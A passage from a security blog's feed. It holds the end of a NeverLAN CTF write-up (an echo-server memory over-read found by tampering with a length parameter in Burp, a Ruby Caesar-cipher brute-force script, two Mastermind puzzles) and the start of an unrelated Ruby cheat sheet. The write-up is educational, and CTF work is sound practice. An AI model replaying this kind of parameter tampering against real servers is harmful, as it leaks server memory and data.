<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">    &lt;head&gt;</div><div class="line">        &lt;title&gt;A slight cut&lt;/title&gt;</div><div class="line">        &lt;script src=&quot;js/jquery.js&quot;&gt;&lt;/script&gt;</div><div class="line">        &lt;script&gt;</div><div class="line">[...]</div><div class="line">        &lt;/script&gt;</div><div class="line">    &lt;/head&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">        &lt;div&gt;</div><div class="line">            &lt;h1&gt;type in some text to have the server repeat it back&lt;/h1&gt;</div><div class="line">            &lt;form onsubmit=&quot;getEcho(); return false;&quot;&gt;</div><div class="line">                &lt;input id=&quot;text&quot; name=&quot;text&quot; type=&quot;text&quot; placeholder=&quot;type some text here&quot;/&gt;</div><div class="line">                &lt;input id=&quot;length&quot; type=&quot;hidden&quot; name=&quot;length&quot; value=&quot;0&quot;/&gt;</div><div class="line">                &lt;input type=&quot;submit&quot;/&gt;</div><div class="line">            &lt;/form&gt;</div><div class="line">            &lt;p id=&quot;echo&quot;&gt;output will appear here&lt;/p&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>There is two parameters in te request url: <code>length</code> and <code>text</code>. <code>text</code> comes from the input field, and <code>length</code> is calculated with javascript.</p>
<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getEcho</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> text = $(<span class="string">'#text'</span>).val();</div><div class="line">    <span class="keyword">var</span> length = $(<span class="string">'#length'</span>).val();</div><div class="line">    $.ajax(<span class="string">'echo.php?length='</span>+length+<span class="string">'&amp;text='</span>+text).done(<span class="function"><span class="keyword">function</span>(<span class="params">echoed</span>)</span>&#123;</div><div class="line">        $(<span class="string">'#echo'</span>).text(echoed);</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    $(<span class="string">'#text'</span>).on(<span class="string">'input'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        $(<span class="string">'#length'</span>).val($(<span class="string">'#text'</span>).val().length);</div><div class="line">    &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>If I submit <code>A</code>, the calculated length is <code>1</code>.</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET /echo.php?length=1&amp;text=A HTTP/1.1</div><div class="line">Host: neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123</div><div class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0</div><div class="line">Accept: */*</div><div class="line">Accept-Language: en-US,en;q=0.5</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:9123/</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">Connection: close</div></pre></td></tr></table></figure></p>
<p>But what will happen if I change the value from 1 to 1000 with Burp:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /echo.php?length=1000&amp;text=A HTTP/1.1</div></pre></td></tr></table></figure></p>
<p>The server displays more than intended:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Auo$@uyc kds2^4a ady 5 tyusft tuyuy_#65afajty ajb tjuflt ty%&amp;(juuyttyjtji KEY: flag&#123;bleeding_in_javascript&#125; SDF4 asd6f ayj1dsgff@ af ttmtum56tu$%ga wrg3@#%aa9-mtyumty dfgsaumg68g$%ershe as 9tuyt t9uty38dsdfg-5f htyd45s#$</div></pre></td></tr></table></figure></p>
<p>Flag is: <code>bleeding_in_javascript</code>.</p>
<h2 id="300-webcipher-web">300 - WebCipher - Web</h2>
<blockquote>
<p>#anti-human</p>
<p><a href="http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/" target="_blank" rel="external">http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/</a></p>
<p>word list:</p>
<p><a href="https://s3-us-west-2.amazonaws.com/neverlanctf/files/words.txt" target="_blank" rel="external">https://s3-us-west-2.amazonaws.com/neverlanctf/files/words.txt</a></p>
</blockquote>
<p>Source:</p>
<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>anti-human cipher<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"cipher_box"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"cipher"</span>&gt;</span>shhsjwfl<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"form_box"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"form"</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">action</span>=<span class="string">"?"</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"deciphered"</span> <span class="attr">id</span>=<span class="string">"deciphered"</span>/&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>/&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>First thing is to understand what to do. Here is what the server do:</p>
<ul>
<li>A word is picked up randomly from <code>words.txt</code></li>
<li>This word is randomly rotated (Caesar cipher with a shift between 1 and 25)</li>
<li>Then the shifted word is displayed for a few seconds</li>
<li>A new word is picked up and so on...</li>
</ul>
<p>So we need a script that:</p>
<ul>
<li>Get the shifted word</li>
<li>Cross the dictionary and test words one by one (only same length as teh shifted word)</li>
<li>For each tested word try all possible shifting</li>
<li>Break when that match</li>
<li>Send the answer (decipered/unshifted word)</li>
<li>Get the flag</li>
</ul>
<p>So that's what I did with a ruby script and <code>curb</code>:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ ruby webcipher.rb</div><div class="line">• Connexion works</div><div class="line">• Cracking ciphered word</div><div class="line">• Deciphered: cassidony</div><div class="line">• Sending answer</div><div class="line">• Flag: c34s3r_c1ph3r_70_7h3_m4x</div></pre></td></tr></table></figure></p>
<p>My ruby script:</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line"><span class="comment"># from https://gist.github.com/matugm/db363c7131e6af27716c</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesar_cipher</span><span class="params">(string, shift = <span class="number">1</span>)</span></span></div><div class="line">    alphabet   = Array(<span class="string">'a'</span>..<span class="string">'z'</span>)</div><div class="line">    encrypter  = Hash[alphabet.zip(alphabet.rotate(shift))]</div><div class="line">    string.chars.map &#123; <span class="params">|c|</span> encrypter.fetch(c, <span class="string">" "</span>) &#125;</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">hostname = <span class="string">'http://neverlanctf-challenges-elb-248020705.us-west-2.elb.amazonaws.com:7129/index.php'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'PHPSESSID=30ff4361f8af2985595bff7c9614b1f1'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line"></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/anti\-human cipher/</span>)</div><div class="line">  puts <span class="string">'• Connexion works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># get the cipher word</span></div><div class="line">ciphered_word = c.body_str.match(<span class="regexp">/&lt;h1 id="cipher"&gt;([a-zA-Z]*)&lt;\/h1&gt;/</span>).captures[<span class="number">0</span>]</div><div class="line">ciphered_word.downcase! <span class="comment"># put lowercase</span></div><div class="line">ciphered_word_length = ciphered_word.length</div><div class="line"></div><div class="line">puts <span class="string">'• Cracking ciphered word'</span></div><div class="line">do_break = <span class="literal">false</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">File.open(<span class="string">"words.txt"</span>, <span class="string">'r'</span>) <span class="keyword">do</span> <span class="params">|file|</span></div><div class="line">    file.each <span class="keyword">do</span> <span class="params">|word|</span></div><div class="line">        word.chomp! <span class="comment"># remove spaces</span></div><div class="line">        <span class="keyword">if</span> word.length.eql?(ciphered_word_length) <span class="comment"># only try word with same length</span></div><div class="line">            answer = word <span class="comment"># save the word because it can be mixed case</span></div><div class="line">            word.downcase! <span class="comment"># put lowercase</span></div><div class="line">            <span class="comment"># puts "word: #&#123;word&#125;"</span></div><div class="line">            (<span class="number">1</span>..<span class="number">25</span>).each <span class="keyword">do</span> <span class="params">|i|</span></div><div class="line">                <span class="comment"># puts caesar_cipher(word, i).join</span></div><div class="line">                <span class="keyword">if</span> caesar_cipher(word, i).join == ciphered_word</div><div class="line">                    puts <span class="string">"• Deciphered: <span class="subst">#&#123;word&#125;</span>"</span></div><div class="line">                    do_break = <span class="literal">true</span></div><div class="line">                    <span class="keyword">break</span></div><div class="line">                <span class="keyword">end</span></div><div class="line">            <span class="keyword">end</span></div><div class="line">        <span class="keyword">end</span></div><div class="line">        <span class="keyword">break</span> <span class="keyword">if</span> do_break</div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">puts <span class="string">"• Sending answer"</span></div><div class="line">c.url = hostname.concat(<span class="string">"?deciphered=<span class="subst">#&#123;answer&#125;</span>"</span>)</div><div class="line">c.perform</div><div class="line"></div><div class="line">puts <span class="string">"• Flag: "</span>.concat(c.body_str.match(<span class="regexp">/&lt;p&gt;flag&#123;(.*)&#125;&lt;\/p&gt;/</span>).captures[<span class="number">0</span>])</div></pre></td></tr></table></figure></p>
<p><strong>Note</strong>: This is not web, this is scripting.</p>
<h2 id="50-master-mind-1-other">50 - Master Mind 1 - Other</h2>
<blockquote>
<p>Can you break my three digit lock?</p>
<p><a href="https://ctf.neverlanctf.com/files/fd671a9b0e49da2d34c8fcc055663d9c/MasterMind1.txt" target="_blank" rel="external">MasterMind1.txt</a></p>
</blockquote>
<p>Source:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">+-----------------------+</div><div class="line">|       |       |       |</div><div class="line">|   7   |   3   |   6   | One number is correct but wrongly placed</div><div class="line">|       |       |       |</div><div class="line">|_______|_______|_______|</div><div class="line">|       |       |       |</div><div class="line">|   0   |   6   |   5   | One number is correct and correctly placed</div><div class="line">|       |       |       |</div><div class="line">|_______|_______|_______|</div><div class="line">|       |       |       |</div><div class="line">|   3   |   7   |   2   | Two numbers are correct but wrongly placed</div><div class="line">|       |       |       |</div><div class="line">|_______|_______|_______|</div><div class="line">|       |       |       |</div><div class="line">|   6   |   4   |   7   | No numbers are correct</div><div class="line">|       |       |       |</div><div class="line">|_______|_______|_______|</div><div class="line">|       |       |       |</div><div class="line">|   5   |   2   |   4   | One number is correct and correctly placed</div><div class="line">|       |       |       |</div><div class="line">|       |       |       |</div><div class="line">+-----------------------+</div></pre></td></tr></table></figure></p>
<p>Rules: <a href="https://en.wikipedia.org/wiki/Mastermind_(board_game)" target="_blank" rel="external">Mastermind</a></p>
<p>Code-breaking:</p>
<ul>
<li>Line 4: 647, No numbers are correct =&gt; [0,1,2,3,5,8,9] are possible</li>
<li>Line 1: 736, One number is correct but wrongly placed =&gt; 7 and 6 are wrong, so 3 is in the code and is right or left</li>
<li>Line 2: 065, One number is correct and correctly placed =&gt; 6 is wrong, so 0 or 5 is in the code and corrctly placed</li>
<li>Line 3: 372, Two numbers are correct but wrongly placed =&gt; 7 is wrong, 3 and 2 are good so [3,2,[0|5]] are possible</li>
<li>Line 5: 524, One number is correct and correctly placed =&gt; Only one number is correct, 2 is good so 5 is wrong and [3,2,0] are possible</li>
<li>(We have the three numbers so now let's order them)</li>
<li>Line 5: 524, One number is correct and correctly placed =&gt; 2 is middle</li>
<li>Line 2: 065, One number is correct and correctly placed =&gt; 0 is left</li>
<li>So 3 is right</li>
</ul>
<p>Flag is <code>023</code>.</p>
<h2 id="100-master-mind-2-other">100 - Master Mind 2 - Other</h2>
<blockquote>
<p>I've upgraded my lock! Can you solve it?</p>
<p><a href="https://ctf.neverlanctf.com/files/7ce349ea5750338cb65d4e92cbd1a56e/MasterMind2.txt" target="_blank" rel="external">MasterMind2.txt</a></p>
</blockquote>
<p>Source:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">+-------------------------------+</div><div class="line">|       |       |       |       |</div><div class="line">|   9   |   5   |   3   |   2   | One number is correct but wrongly placed</div><div class="line">|       |       |       |       |</div><div class="line">|_______|_______|_______|_______|</div><div class="line">|       |       |       |       |</div><div class="line">|   1   |   6   |   7   |   3   | Two numbers are correct and correctly placed</div><div class="line">|       |       |       |       |</div><div class="line">|_______|_______|_______|_______|</div><div class="line">|       |       |       |       |</div><div class="line">|   0   |   6   |   5   |   9   | Two numbers are correct but wrongly placed</div><div class="line">|       |       |       |       |</div><div class="line">|_______|_______|_______|_______|</div><div class="line">|       |       |       |       |</div><div class="line">|   2   |   4   |   3   |   8   | No numbers are correct</div><div class="line">|       |       |       |       |</div><div class="line">|_______|_______|_______|_______|</div><div class="line">|       |       |       |       |</div><div class="line">|   5   |   2   |   4   |   0   | One number is correct and correctly placed</div><div class="line">|       |       |       |       |</div><div class="line">|       |       |       |       |</div><div class="line">+-------------------------------+</div></pre></td></tr></table></figure></p>
<p>Rules: <a href="https://en.wikipedia.org/wiki/Mastermind_(board_game)" target="_blank" rel="external">Mastermind</a></p>
<p>Code-breaking:</p>
<ul>
<li>Line 4: 2438, No numbers are correct =&gt; Only [0,1,5,6,7,9] are possible</li>
<li>Line 5: 5240, One number is correct and correctly placed =&gt; 2 and 4 are wrong, so 0 or 5 is in the code, [[0|5],1,6,7,9]</li>
<li>Line 1: 9532, One number is correct but wrongly placed =&gt; 2 and 3 are wrong, so 9 or 5 is good, [0|5] &amp; [5|9] = 5 so [1,5,6,7] OR [0|5] &amp; [5|9] = [0,9] so so [0,1,6,7,9]</li>
<li>Line 2: 1673, Two numbers are correct and correctly placed =&gt; Only two number are good so [1,5,6,7] impossible so [0,1,6,7,9] is only possible</li>
<li>(Now we need to filter the 5 numbers to keep only 4)</li>
<li>Line 1: Confirmed [9], Possible [0,1,6,7]</li>
<li>Line 3: Confirmed [9,[0|6]], Possible [1,7]</li>
<li>Line 5: Confirmed [9,0], Possible [1,7] so [0,1,7,9] are the four numbers</li>
<li>(We have the four numbers so now let's order them)</li>
<li>Line 2: Place [1,x,7,x]</li>
<li>Line 5: Place [1,x,7,0] so  [1,9,7,0]</li>
</ul>
<p>Flag is <code>1970</code>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;By&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;th&gt;Comment&lt;/th&gt;
&lt;/t
    
    </summary>
    
      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="https://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>Ruby cheat sheet with examples</title>
    <link href="https://rawsec.ml/en/Ruby-cheat-sheet-with-examples/"/>
    <id>https://rawsec.ml/en/Ruby-cheat-sheet-with-examples/</id>
    <published>2017-02-19T23:00:00.000Z</published>
    <updated>2017-02-21T22:56:18.223Z</updated>
    
    <content type="html"><![CDATA[<p>Take it <s>easy</s> Ruby!</p>
<h2 id="basic-concepts">Basic concepts</h2>
<h3 id="hello-world">Hello World</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">puts <span class="string">"Hello World!"</span></div></pre></td></tr></table></figure></p>
<h3 id="comments">Comments</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># single line comment</span></div><div class="line"></div><div class="line"><span class="comment">=begin</span></div><div class="line">  Multi-lines</div><div class="line">  comment</div><div class="line">=end</div></pre></td></tr></table></figure></p>
<h3 id="variables">Variables</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">my_var = <span class="number">42</span></div><div class="line">My_constant_var = <span class="number">31337</span></div></pre></td></tr></table></figure></p>
<h3 id="shorthand-assignment">Shorthand assignment</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">a += b <span class="comment"># a = a + b</span></div><div class="line">a -= b <span class="comment"># a = a - b</span></div><div class="line">a *= b <span class="comment"># a = a * b</span></div><div class="line">a /= b <span class="comment"># a = a / b</span></div><div class="line">a %= b <span class="comment"># a = a % b</span></div><div class="line">a **= b <span class="comment"># a = a**b</span></div></pre></td></tr></table></figure></p>
<h3 id="parallel-assignment">Parallel assignment</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a, b, c = <span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span></div></pre></td></tr></table></figure></p>
<h3 id="input">Input</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">input = gets</div></pre></td></tr></table></figure></p>
<h2 id="control-structures">Control structures</h2>
<h3 id="equality">Equality</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">irb(main):001:0&gt;</span> <span class="number">42</span> == <span class="number">42.0</span> <span class="comment"># equal values</span></div><div class="line">=&gt; true</div><div class="line"><span class="meta">irb(main):002:0&gt;</span> <span class="number">42</span>.eql?(<span class="number">42.0</span>) <span class="comment"># equal values and same type</span></div><div class="line">=&gt; false</div></pre></td></tr></table></figure></p>
<h3 id="subsumption">Subsumption</h3>
<p>Be cautious!</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">irb(main):004:0&gt;</span> <span class="number">42</span> === (<span class="number">10</span>..<span class="number">100</span>)</div><div class="line">=&gt; false</div><div class="line"><span class="meta">irb(main):005:0&gt;</span> <span class="number">42</span> === (<span class="number">50</span>..<span class="number">100</span>)</div><div class="line">=&gt; false</div><div class="line"><span class="meta">irb(main):006:0&gt;</span> (<span class="number">10</span>..<span class="number">100</span>) === <span class="number">42</span></div><div class="line">=&gt; true</div><div class="line"><span class="meta">irb(main):007:0&gt;</span> (<span class="number">50</span>..<span class="number">100</span>) === <span class="number">42</span></div><div class="line">=&gt; false</div><div class="line"><span class="meta">irb(main):008:0&gt;</span> Integer === <span class="number">42</span></div><div class="line">=&gt; true</div><div class="line"><span class="meta">irb(main):009:0&gt;</span> Integer === <span class="string">'string'</span></div><div class="line">=&gt; false</div><div class="line"><span class="meta">irb(main):010:0&gt;</span> <span class="number">42</span> === Integer</div><div class="line">=&gt; false</div><div class="line"><span class="meta">irb(main):011:0&gt;</span> /at/ === <span class="string">'Hi mate'</span></div><div class="line">=&gt; true</div><div class="line"><span class="meta">irb(main):012:0&gt;</span> /at/ === <span class="string">'Hello'</span></div><div class="line">=&gt; false</div><div class="line"><span class="meta">irb(main):013:0&gt;</span> <span class="string">'Hi mate'</span> === <span class="regexp">/at/</span></div><div class="line">=&gt; false</div></pre></td></tr></table></figure></p>
<h3 id="if-elsif-else-statement">if/elsif/else statement</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">val = <span class="number">1337</span></div><div class="line"><span class="keyword">if</span> val == <span class="number">42</span></div><div class="line">  puts <span class="string">"That's always true"</span></div><div class="line"><span class="keyword">elsif</span> val == <span class="number">1000</span></div><div class="line">  puts <span class="string">"Nearly right"</span></div><div class="line"><span class="keyword">elsif</span> val == <span class="number">1300</span></div><div class="line">  puts <span class="string">"Even closer"</span></div><div class="line"><span class="keyword">else</span></div><div class="line">  puts <span class="string">"Nah!!"</span></div><div class="line"><span class="keyword">end</span></div><div class="line"><span class="comment"># ouput: Nah!</span></div></pre></td></tr></table></figure></p>
<h3 id="unless-statement">unless statement</h3>
<p>Opposite of <code>if</code></p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">val = <span class="number">1337</span></div><div class="line"><span class="keyword">unless</span> val == <span class="number">1337</span></div><div class="line">  puts <span class="string">"Your're the elite!"</span></div><div class="line"><span class="keyword">else</span></div><div class="line">  puts <span class="string">"Master!"</span></div><div class="line"><span class="keyword">end</span></div><div class="line"><span class="comment"># output: Master!</span></div></pre></td></tr></table></figure></p>
<h3 id="logical-operators">Logical operators</h3>
<table>
<thead>
<tr>
<th>Symbol</th>
<th>Word</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&amp;&amp;</code></td>
<td><code>and</code></td>
</tr>
<tr>
<td><code>||</code></td>
<td><code>or</code></td>
</tr>
<tr>
<td><code>!</code></td>
<td><code>not</code></td>
</tr>
</tbody>
</table>
<h3 id="case-statement">case statement</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">a = <span class="number">10</span></div><div class="line"><span class="keyword">case</span> a</div><div class="line"><span class="keyword">when</span> <span class="number">1</span></div><div class="line">  puts <span class="string">'One'</span></div><div class="line"><span class="keyword">when</span> <span class="number">2</span></div><div class="line">  puts <span class="string">'Two'</span></div><div class="line"><span class="keyword">when</span> <span class="number">5</span></div><div class="line">  puts <span class="string">'Five'</span></div><div class="line"><span class="keyword">when</span> <span class="number">10</span></div><div class="line">  puts <span class="string">'Ten'</span></div><div class="line"><span class="keyword">when</span> <span class="number">42</span>, <span class="number">1337</span>, <span class="number">31337</span></div><div class="line">  puts <span class="string">'Master!'</span></div><div class="line"><span class="keyword">else</span></div><div class="line">  puts <span class="string">'Nah!'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"><span class="comment"># output: Ten</span></div></pre></td></tr></table></figure></p>
<h3 id="while-loop">while loop</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">a = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> a &lt;= <span class="number">5</span></div><div class="line">  puts a</div><div class="line">  a += <span class="number">1</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<h3 id="until-loop">until loop</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">a = <span class="number">0</span></div><div class="line"><span class="keyword">until</span> a &gt; <span class="number">5</span></div><div class="line">  puts a</div><div class="line">  a += <span class="number">1</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
